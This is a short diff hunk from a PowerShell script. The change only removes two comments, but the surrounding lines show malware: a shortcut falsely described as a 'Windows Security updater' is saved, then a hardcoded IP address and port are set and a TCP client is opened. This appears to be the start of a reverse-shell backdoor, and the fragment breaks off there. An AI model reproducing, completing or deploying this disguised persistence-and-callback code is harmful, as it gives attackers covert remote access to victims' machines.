@@ -16,9 +16,7 @@ function cleanup {
     $shortcut.Description="Windows Security updater";
     $Shortcut.Save();
 
-    // Setup IPADDR
     $address = '192.168.0.10'
-    // Setup PORT
     $port = '12345'
 
     $client = New-Object system.net.sockets.tcpclient
